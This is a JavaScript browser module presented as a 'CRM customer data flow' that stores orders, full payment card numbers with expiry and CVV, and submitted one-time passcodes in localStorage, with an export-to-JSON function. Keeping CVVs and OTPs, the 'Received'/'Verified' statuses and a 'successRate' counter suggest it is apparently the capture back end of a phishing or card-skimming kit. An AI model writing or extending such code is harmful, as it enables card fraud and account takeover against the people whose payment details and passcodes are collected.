// CRM Customer Data Flow System (stable local-first mode)
class CustomerCRMFlow {
  constructor() {
    this.storageKey = 'crm_customer_data';
    this.legacyStorageKeys = ['crmData', 'crm_data_cross_device', 'crm_data_hybrid', 'crm_data_v2'];
    this.deviceId = this.getDeviceId();
    this.maxEntriesPerType = 500;

    this.lastSyncOutcome = 'local_only';
    this.lastSyncError = '';
    this.lastSyncAttemptAt = null;
    this.lastCloudReadOk = null;
    this.lastCloudWriteOk = null;

    this.init();
  }

  init() {
    this.ensureLocalData();
    this.migrateLegacyLocalData();

    window.addEventListener('online', () => {
      this.syncFromCloud(true);
    });

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        this.syncFromCloud();
      }
    });
  }

  getDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11);
      localStorage.setItem('crmDeviceId', deviceId);
    }
    return deviceId;
  }

  getEmptyData() {
    return {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        lastUpdated: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'customer_flow_local_v3',
        mode: 'local_only'
      }
    };
  }

  normalizeData(data) {
    const normalized = data && typeof data === 'object' ? data : {};
    const base = this.getEmptyData();

    return {
      orders: Array.isArray(normalized.orders) ? normalized.orders : [],
      cards: Array.isArray(normalized.cards) ? normalized.cards : [],
      otp: Array.isArray(normalized.otp) ? normalized.otp : [],
      settings: {
        ...base.settings,
        ...(normalized.settings || {})
      }
    };
  }

  readStorageData(storageKey) {
    try {
      const raw = localStorage.getItem(storageKey);
      if (!raw) {
        return null;
      }

      return this.normalizeData(JSON.parse(raw));
    } catch (error) {
      console.warn('CRM: Failed to parse storage key:', storageKey, error);
      return null;
    }
  }

  saveCRMData(data) {
    try {
      const normalized = this.normalizeData(data);
      normalized.settings.lastUpdated = new Date().toISOString();
      normalized.settings.deviceId = this.deviceId;
      normalized.settings.version = 'customer_flow_local_v3';
      normalized.settings.mode = 'local_only';

      localStorage.setItem(this.storageKey, JSON.stringify(normalized));
      localStorage.setItem('crmLastSync', Date.now().toString());
      return true;
    } catch (error) {
      console.error('CRM: Error saving local CRM data:', error);
      return false;
    }
  }

  getCRMData() {
    const primaryData = this.readStorageData(this.storageKey);
    if (primaryData) {
      return primaryData;
    }

    const empty = this.getEmptyData();
    this.saveCRMData(empty);
    return empty;
  }

  ensureLocalData() {
    const data = this.getCRMData();
    this.saveCRMData(data);
  }

  removeDuplicates(array, key) {
    const seen = new Set();
    return array.filter((item) => {
      const itemKey = item && item[key];
      if (!itemKey || seen.has(itemKey)) {
        return false;
      }
      seen.add(itemKey);
      return true;
    });
  }

  sortNewestFirst(array) {
    return [...array].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  }

  mergeData(currentData, incomingData) {
    const merged = {
      orders: [...(incomingData.orders || []), ...(currentData.orders || [])],
      cards: [...(incomingData.cards || []), ...(currentData.cards || [])],
      otp: [...(incomingData.otp || []), ...(currentData.otp || [])],
      settings: {
        ...(currentData.settings || {}),
        ...(incomingData.settings || {}),
        lastUpdated: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'customer_flow_local_v3',
        mode: 'local_only'
      }
    };

    merged.orders = this.sortNewestFirst(this.removeDuplicates(merged.orders, 'id')).slice(0, this.maxEntriesPerType);
    merged.cards = this.sortNewestFirst(this.removeDuplicates(merged.cards, 'id')).slice(0, this.maxEntriesPerType);
    merged.otp = this.sortNewestFirst(this.removeDuplicates(merged.otp, 'id')).slice(0, this.maxEntriesPerType);

    return merged;
  }

  getTotalEntries(data) {
    return (data.orders?.length || 0) + (data.cards?.length || 0) + (data.otp?.length || 0);
  }

  migrateLegacyLocalData() {
    let merged = this.getCRMData();
    let changed = false;

    this.legacyStorageKeys.forEach((key) => {
      const legacyData = this.readStorageData(key);
      if (legacyData && this.getTotalEntries(legacyData) > 0) {
        merged = this.mergeData(merged, legacyData);
        changed = true;
      }
    });

    if (changed) {
      this.saveCRMData(merged);
      this.lastSyncOutcome = 'local_migrated';
    }

    return changed;
  }

  async syncFromCloud() {
    this.lastSyncAttemptAt = new Date().toISOString();
    this.migrateLegacyLocalData();

    this.lastSyncOutcome = this.lastSyncOutcome === 'local_migrated' ? 'local_migrated' : 'local_only';
    this.lastSyncError = '';
    this.lastCloudReadOk = null;
    this.lastCloudWriteOk = null;

    return true;
  }

  async pushLatestToCloud() {
    return this.syncFromCloud(true);
  }

  async addCustomerOrder(orderData) {
    this.migrateLegacyLocalData();

    const data = this.getCRMData();
    const order = {
      id: 'order_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      fullName: orderData.fullName || 'Unknown Customer',
      email: orderData.email || 'unknown@email.com',
      phone: orderData.phone || 'Unknown',
      orderTotal: orderData.orderTotal || '0',
      address: orderData.address || '',
      city: orderData.city || '',
      state: orderData.state || '',
      pincode: orderData.pincode || '',
      addressType: orderData.addressType || '',
      items: orderData.items || '',
      status: 'Completed'
    };

    data.orders.unshift(order);
    data.orders = this.sortNewestFirst(this.removeDuplicates(data.orders, 'id')).slice(0, this.maxEntriesPerType);

    this.saveCRMData(data);
    await this.pushLatestToCloud();
    return order;
  }

  async addCustomerCard(cardData) {
    this.migrateLegacyLocalData();

    const data = this.getCRMData();
    const card = {
      id: 'card_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      cardName: cardData.cardName || 'Unknown Customer',
      cardNumber: cardData.cardNumber || '**** **** **** ****',
      expiry: cardData.expiry || 'MM/YY',
      cvv: cardData.cvv || '***',
      status: 'Received'
    };

    data.cards.unshift(card);
    data.cards = this.sortNewestFirst(this.removeDuplicates(data.cards, 'id')).slice(0, this.maxEntriesPerType);

    this.saveCRMData(data);
    await this.pushLatestToCloud();
    return card;
  }

  async addCustomerOTP(otpData) {
    this.migrateLegacyLocalData();

    const data = this.getCRMData();
    const otp = {
      id: 'otp_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      submittedOTP: otpData.submittedOTP || '000000',
      email: otpData.email || 'unknown@email.com',
      phone: otpData.phone || 'Unknown',
      status: 'Verified'
    };

    data.otp.unshift(otp);
    data.otp = this.sortNewestFirst(this.removeDuplicates(data.otp, 'id')).slice(0, this.maxEntriesPerType);

    this.saveCRMData(data);
    await this.pushLatestToCloud();
    return otp;
  }

  getCRMStats() {
    const data = this.getCRMData();
    const lastSyncRaw = localStorage.getItem('crmLastSync');
    const lastSync = lastSyncRaw ? new Date(parseInt(lastSyncRaw, 10)).toISOString() : data.settings.lastUpdated;

    return {
      totalOrders: data.orders.length,
      totalCards: data.cards.length,
      totalOTP: data.otp.length,
      successRate: data.otp.length > 0 ? 100 : 0,
      lastSync,
      deviceId: this.deviceId,
      isOnline: navigator.onLine,
      syncEnabled: true,
      globalSharedSync: false
    };
  }

  exportCRMData() {
    const data = this.getCRMData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_customer_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  exportData() {
    this.exportCRMData();
  }

  async clearCRMData() {
    this.saveCRMData(this.getEmptyData());
    await this.syncFromCloud();
    return true;
  }

  async refreshCRMData() {
    return this.syncFromCloud();
  }

  async forceCRMRefresh() {
    return this.syncFromCloud(true);
  }

  getSyncDiagnostics() {
    return {
      outcome: this.lastSyncOutcome,
      error: this.lastSyncError || null,
      lastCloudReadOk: this.lastCloudReadOk,
      lastCloudWriteOk: this.lastCloudWriteOk,
      lastSyncAttemptAt: this.lastSyncAttemptAt
    };
  }
}

window.customerCRMFlow = new CustomerCRMFlow();

window.addOrder = async function(data) {
  return window.customerCRMFlow.addCustomerOrder(data);
};

window.addCardDetails = async function(data) {
  return window.customerCRMFlow.addCustomerCard(data);
};

window.addOTPData = async function(data) {
  return window.customerCRMFlow.addCustomerOTP(data);
};

window.syncCRMFromCloud = async function() {
  return window.customerCRMFlow.syncFromCloud();
};

window.forceCRMRefresh = async function() {
  return window.customerCRMFlow.forceCRMRefresh();
};

window.refreshCRMData = async function() {
  return window.customerCRMFlow.refreshCRMData();
};

window.getCRMSyncDiagnostics = function() {
  return window.customerCRMFlow.getSyncDiagnostics();
};

window.crossDeviceCRMSync = window.customerCRMFlow;
window.cloudCRMStorage = window.customerCRMFlow;

console.log('Customer CRM Flow System initialized - stable local mode');
